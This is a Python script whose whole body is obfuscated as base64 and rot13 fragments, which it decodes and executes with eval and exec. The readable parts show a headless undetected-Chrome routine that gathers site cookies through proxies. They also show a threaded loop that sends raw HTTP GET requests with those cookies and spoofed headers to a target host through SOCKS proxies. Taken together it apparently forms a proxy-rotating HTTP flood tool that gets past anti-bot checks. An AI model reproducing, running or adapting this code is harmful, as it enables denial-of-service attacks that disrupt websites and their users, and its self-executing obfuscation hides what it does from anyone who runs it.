import base64, codecs
magic = 'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0NCmltcG9ydCB0aHJlYWRpbmcsIGRhdGV0aW1lLCB0aW1lLCBzeXMsIHNvY2tldCwgc29ja3MsIHNzbCwgcmFuZG9tDQppbXBvcnQgdW5kZXRlY3RlZF9jaHJvbWVkcml2ZXIgYXMgd2ViZHJpdmVyDQpmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgdXJscGFyc2UNCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIGluaXQNCmluaXQoY29udmVydD1UcnVlKQ0KDQpkZWYgZ2V0X2Nvb2tpZShwcm94eSwgdXJsLCB0aHJlYWRfbnVtLCByYW51YSk6DQogICAgZ2xvYmFsIGZhaWxlZCwgc3VjY2Vzcw0KICAgIG9wdGlvbnMgPSB3ZWJkcml2ZXIuQ2hyb21lT3B0aW9ucygpDQogICAgb3B0aW9ucy5hZGRfYXJndW1lbnQoJy0tcHJveHktc2VydmVyPXswfScuZm9ybWF0KHByb3h5KSkNCiAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgnLS1uby1zYW5kYm94JykNCiAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgnLS1kaXNhYmxlLXNldHVpZC1zYW5kYm94JykNCiAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgnLS1kaXNhYmxlLWluZm9iYXJzJykNCiAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgnLS1kaXNhYmxlLWxvZ2dpbmcnKQ0KICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCctLWRpc2FibGUtbG9naW4tYW5pbWF0aW9ucycpDQogICAgb3B0aW9ucy5hZGRfYXJndW1lbnQoJy0tZGlzYWJsZS1ub3RpZmljYXRpb25zJykNCiAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgnLS1kaXNhYmxlLWdwdScpDQogICAgb3B0aW9ucy5hZGRfYXJndW1lbnQoJy0taW5jb2duaXRvJykNCiAgICBvcHRpb25zLmFkZF9hcmd1bWVudCgnLS1oZWFkbGVzcycpDQogICAgb3B0aW9ucy5hZGRfYXJndW1lbnQoJy0tbGFuZz1rb19LUicpDQogICAgb3B0aW9ucy5hZGRfYXJndW1lbnQoIi0tc3RhcnQtbWF4bWl6ZWQiKQ0KICAgIG9wdGlvbnMuYWRkX2FyZ3VtZW50KCctLXVzZXItYWdlbnQ9JytyYW51YSkNCiAgICB0cnk6DQogICAgICAgIGRyaXZlciA9IHdlYmRyaXZlci5DaHJvbWUob3B0aW9ucz1vcHRpb25zKQ0KICAgICAgICBkcml2ZXIuZ2V0KHVybCkNCiAgICAgICAgZHJpdmVyLmltcGxpY2l0bHlfd2FpdCg1KQ0KICAgICAgICB0ciwgbG9vcCA9IDEsIDANCiAgICAgICAgd2hpbGUgdHIgPT0gMToNCiAgICAgICAgICAgIGlmIGxvb3AgPT0gMTU6DQogICAgICAgICAgICAgICAgZmFpbGVkICs9IDENCiAgICAgICAgICAgICAgICBwcmludCgiIyIrc3RyKHRocmVhZF9udW0pKyIgRmFpbGVkIDogUHJveHkgQ29ubmVjdGlvbiBFcnJvciIgKyAiIEFsbC9TdWNjZXNzL0ZhaWxbIitzdHIodG90YWwpKyIvIitzdHIoc3VjY2VzcykrIi8iK3N0cihmYWlsZWQpKyJdIikNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIGNvb2tpZXMgPSBkcml2ZXIuZ2V0X2Nvb2tpZXMoKQ0KICAgICAgICAgICAgdHJ5eSA9IDANCiAgICAgICAgICAgIGZvciBpIGluIGNvb2tpZXM6DQogICAgICAgICAgICAgICAgaWYgaVs'
love = 'aozSgMFqqVQ09VPqwMy9woTIupzShL2HaBt0XVPNtVPNtVPNtVPNtVPNtVPNtVPOwo29enJIXDIVtCFOxpzy2MKVhM2I0K2Aio2gcMKZbXIg0pay5KD0XVPNtVPNtVPNtVPNtVPNtVPNtVPOwo29enJHtCFOzVagwo29enJIXDIWoW25uoJHaKK09r2Aio2gcMHcOHyfaqzSfqJHaKK0vQDbtVPNtVPNtVPNtVPNtVPNtVPNtVTElnKMypv5kqJy0XPxAPvNtVPNtVPNtVPNtVPNtVPNtVPNtqUVtCFNjQDbtVPNtVPNtVPNtVPNtVPNtMJkmMGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtqUW5rFNeCFNkQDbtVPNtVPNtVPNtVPNtVPNtVPNtVUOup3ZAPvNtVPNtVPNtVPNtVTkio3NtXm0tZD0XVPNtVPNtVPNtVPNtqTygMF5moTIypPtkXD0XVPNtVPNtVPOxpzy2MKVhpKIcqPtcQDbtVPNtVPNtVUA1L2Ayp3ZtXm0tZD0XVPNtVPNtVPOjpzyhqPuTo3WyYxkWE0uHE1WSEH5sEIteVvZvX3A0pvu0nUWyLJEsoaIgXFfvVSA1L2Ayp3ZtBvNvX3Olo3u5XlNvVRSfoP9GqJAwMKAmY0MunJkoVvgmqUVbqT90LJjcXlViVvgmqUVbp3IwL2ImplxeVv8vX3A0pvuzLJyfMJDcXlWqVvgTo3WyYyWSH0IHXD0XVPNtVPNtVPO0nUWyLJEcozphITulMJSxXUEupzqyqQ1lMJSxrFjtLKWapm0bpUWirUxfVTAio2gcMFjtqKWfYPOlLJ51LFxcYaA0LKW0XPxAPvNtVPOyrTAypUDtBt0XVPNtVPNtVPOzLJyfMJDtXm0tZD0XVPNtVPNtVPOjpzyhqPtvVlVep3ElXUEbpzIuMS9hqJ0cXlVtEzScoTIxVQbtHUWirUxtEKWlo3VvVPftVvOOoTjiH3IwL2Impl9TLJyfJlVep3ElXUEiqTSfXFfvYlVep3ElXUA1L2Ayp3ZcXlViVvgmqUVbMzScoTIxXFfvKFVcQDbAPzEyMvOlMJSxrFujpz94rFjtL29in2yyYPO1pzjfVUWuoaIuXGbAPvNtVPO0LKWaMKDtCFO7sD0XVPNtVUEupzqyqSfaqKWcW10tCFO1pzkjLKWmMFu1pzjcYaOuqTtAPvNtVPOcMvO0LKWaMKEoW3IlnFqqVQ09VPVvBt0XVPNtVPNtVPO0LKWaMKEoW3IlnFqqVQ0tVv8vQDbtVPNtqTSlM2I0Jlqbo3A0W10tCFO1pzkjLKWmMFu1pzjcYz5yqTkiLj0XVPNtVUEupzqyqSfap2AbMJ1yW10tCFO1pzkjLKWmMFu1pzjcYaAwnTIgMD0XVPNtVTyzVPV6VvOcovO1pzkjLKWmMFu1pzjcYz5yqTkiLmbAPvNtVPNtVPNtqTSlM2I0Jlqjo3W0W10tCFO1pzkjLKWmMFu1pzjcYz5yqTkiLl5mpTkcqPtvBvVcJmSqQDbtVPNtMJkmMGbAPvNtVPNtVPNtqTSlM2I0Jlqjo3W0W10tCFNvAQDmVvOcMvO1pzkjLKWmMFu1pzjcYaAwnTIgMFN9CFNvnUE0pUZvVTIfp2HtVwtjVt0XVPNtVPNtVPOjLKAmQDbtVPNtpUttCFOjpz94rF5mpTkcqPtvBvVcQDbtVPNtQDbtVPNtMz9lVS8tnJ4tpzShM2HbnJ50XUEbpvxcBt0XVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPO0nUWyLJEcozphITulMJSxXUEupzqyqQ1fLKIhL2tfVTSlM3Z9XUO4YPOwo29enJHfVUEupzqyqPjtpzShqJRcXF5mqTSlqPtcQDbtVPNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtVUOup3ZAPt0XMTIzVTkuqJ5wnPujrPjtL29in2yyYPO0LKWaMKDfVUWuoaIuXG'
god = 'oNCiAgICByZXEgPSAgJ0dFVCAnK3RhcmdldFsndXJpJ10rJyBIVFRQLzEuMVxyXG4nDQogICAgcmVxICs9ICdIb3N0OiAnICsgdGFyZ2V0Wydob3N0J10gKyAnXHJcbicNCiAgICByZXEgKz0gJ0FjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45XHJcbicNCiAgICByZXEgKz0gJ0FjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnJcclxuJw0KICAgIHJlcSArPSAnQWNjZXB0LUxhbmd1YWdlOiBrby1LUixrbztxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuN1xyXG4nDQogICAgcmVxICs9ICdDYWNoZS1Db250cm9sOiBtYXgtYWdlPTBcclxuJw0KICAgIHJlcSArPSAnQ29va2llOiAnICsgY29va2llICsgJ1xyXG4nDQogICAgcmVxICs9IGYnc2VjLWNoLXVhOiAiQ2hyb21pdW0iO3Y9IjEwMCIsICJHb29nbGUgQ2hyb21lIjt2PSIxMDAiXHJcbicNCiAgICByZXEgKz0gJ3NlYy1jaC11YS1tb2JpbGU6ID8wXHJcbicNCiAgICByZXEgKz0gJ3NlYy1jaC11YS1wbGF0Zm9ybTogIldpbmRvd3MiXHJcbicNCiAgICByZXEgKz0gJ3NlYy1mZXRjaC1kZXN0OiBlbXB0eVxyXG4nDQogICAgcmVxICs9ICdzZWMtZmV0Y2gtbW9kZTogY29yc1xyXG4nDQogICAgcmVxICs9ICdzZWMtZmV0Y2gtc2l0ZTogc2FtZS1vcmlnaW5cclxuJw0KICAgIHJlcSArPSAnQ29ubmVjdGlvbjogS2VlcC1BbGl2ZVxyXG4nDQogICAgcmVxICs9ICdVc2VyLUFnZW50OiAnKyByYW51YSArICdcclxuXHJcblxyXG4nDQogICAgdHJ5Og0KICAgICAgICBpZiB0YXJnZXRbJ3NjaGVtZSddID09ICdodHRwcyc6DQogICAgICAgICAgICBwYWNrZXQgPSBzb2Nrcy5zb2Nrc29ja2V0KCkNCiAgICAgICAgICAgIHBhY2tldC5zZXRzb2Nrb3B0KHNvY2tldC5JUFBST1RPX1RDUCwgc29ja2V0LlRDUF9OT0RFTEFZLCAxKQ0KICAgICAgICAgICAgcGFja2V0LnNldF9wcm94eShzb2Nrcy5IVFRQLCBzdHIocHhbMF0pLCBpbnQocHhbMV0pKQ0KICAgICAgICAgICAgcGFja2V0LmNvbm5lY3QoKHN0cih0YXJnZXRbJ2hvc3QnXSksIGludCh0YXJnZXRbJ3BvcnQnXSkpKQ0KICAgICAgICAgICAgcGFja2V0ID0gc3NsLmNyZWF0ZV9kZWZhdWx0X2NvbnRleHQoKS53cmFwX3NvY2tldChwYWNrZXQsIHNlcnZlcl9ob3N0bmFtZT10YXJnZXRbJ2hvc3QnXSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHBhY2tldCA9IHNvY2tzLnNvY2tzb2NrZXQoKQ0KICAgICAgICAgICAgcGFja2V0LnNldHNvY2tvcHQoc29ja2V0LklQUFJPVE9fVENQLCBzb2NrZXQuVENQX05PREVMQVksIDEpDQogICAgICAgICAgICBwYWNrZXQuc2V0X3Byb3h5KHNvY2tzLkhUVFAsIHN0cihweFswXSksIGludChweFsxXSkpDQogICAgICAgICAgICBwYWNrZXQuY29ubmVjdCgoc3RyKHRhcmdld'
destiny = 'SfanT9mqPqqXFjtnJ50XUEupzqyqSfapT9lqPqqXFxcQDbtVPNtMKuwMKO0Bt0XVPNtVPNtVPOlMKE1pz4APvNtVPO3nTyfMFNbqJ50nJksqTygMFNgVTEuqTI0nJ1yYzEuqTI0nJ1yYz5iqltcXF50o3EuoS9mMJAiozEmXPxtCvNjBt0XVPNtVPNtVPO0pax6QDbtVPNtVPNtVPNtVPOzo3VtKlOcovOlLJ5aMFtkZQNcBt0XVPNtVPNtVPNtVPNtVPNtVUOuL2gyqP5mMJ5xXUA0pv5yozAiMTHbpzIkXFxAPvNtVPNtVPNtVPNtVPNtVPO0nJ1yYaAfMJIjXQNhZQNkXzyhqPucoaEypaMuoPxcQDbtVPNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtVUOuL2gyqP5woT9mMFtcQDbtVPNtVPNtVPNtVPOjLKAmQDbAPzEyMvOgLJyhXPx6QDbtVPNtM2kiLzSfVTMunJkyMPjtp3IwL2ImpljtqT90LJjfVUIhqTyfK3EcoJHfVUEbpvjtnJ50MKW2LJjAPvNtVPOzLJyfMJDfVUA1L2Ayp3ZfVUEiqTSfYPO0nUWyLJEsoaIgVQ0tZPjtZPjtZPjtZN0XVPNtVUElrGbAPvNtVPNtVPNtqKWfVQ0tp3ymYzSlM3MoZI0APvNtVPNtVPNtqJ50nJjtCFOmrKZhLKWaqyflKD0XVPNtVPNtVPOjpz94rKOuqTttCFOmrKZhLKWaqyf0KD0XVPNtVPNtVPO0nUVtCFOmrKZhLKWaqyfmKD0XVPNtVPNtVPOcoaEypaMuoPN9VUA5pl5upzq2JmIqQDbtVPNtMKuwMKO0VRyhMTI4EKWlo3V6QDbtVPNtVPNtVUOlnJ50XTLvqKAuM2H6VUO5qTuiowZtr3A5pl5upzq2JmOqsFN8qTSlM2I0CvN8qTygMGcmCvN8qTulMJSxCvN8pUWirUyjLKEbCvN8nJ50MKW2LJj6oKZ+VvxAPvNtVPNtVPNtp3ymYzI4nKDbXD0XVPNtVUIuVQ0to3OyovtaYv91LF50rUDaYPNapvpcYaWyLJDbXF5mpTkcqPtaKT4aXD0XVPNtVUIhqTyfK3EcoJHtCFOxLKEyqTygMF5xLKEyqTygMF5ho3pbXFNeVTEuqTI0nJ1yYaEcoJIxMJk0LFumMJAiozEmCJyhqPu1oaEcoPxcQDbtVPNtMz9lVS8tnJ4to3Oyovujpz94rKOuqTtfVTIhL29xnJ5aCFW1qTLgBPVcBt0XVPNtVPNtVPO0o3EuoPNeCFNkQDbtVPNtpUWcoaDbVvZwVSA0LKW0VUqcqTttVvgmqUVbqT90LJjcXlVtpUWirTyypl4hYvVcQDbtVPNtMz9lVTkcozHtnJ4to3Oyovujpz94rKOuqTtfVTIhL29xnJ5aCFW1qTLgBPVcBt0XVPNtVPNtVPOfnJ5yVQ0toTyhMF5mqUWcpPtcQDbtVPNtVPNtVUEbpzIuMS9hqJ0tXm0tZD0XVPNtVPNtVPOlLJ51LFN9VUWuozEioF5wnT9cL2HboTymqPu1LFxcQDbtVPNtVPNtVUEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CJqyqS9wo29enJHfVTSlM3Z9XTkcozHfVUIloPjtqTulMJSxK251oFjtpzShqJRcXF5mqTSlqPtcQDbtVPNtVPNtVUOlnJ50XPVwVvgmqUVbqTulMJSxK251oFxeVvOUMKDtL29in2yyVQ0+VPVeoTyhMFxAPvNtVPNtVPNtQDbtVPNtpUWcoaDbVvZtI2ScqPOzo3Vtp29fqzHtL29in2yyVvxAPvNtVPO0nJ1yYaAfMJIjXTyhqPu1oaEcoPxcQDbtVPNtpUWcoaDbVvZtEJ5xVTS0qTSwnlVcQDbtVPNtp3ymYzI4nKDbXD0XQDccMvOsK25uoJIsKlN9CFNaK19gLJyhK18aBt0XVPNtVT1unJ4bXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))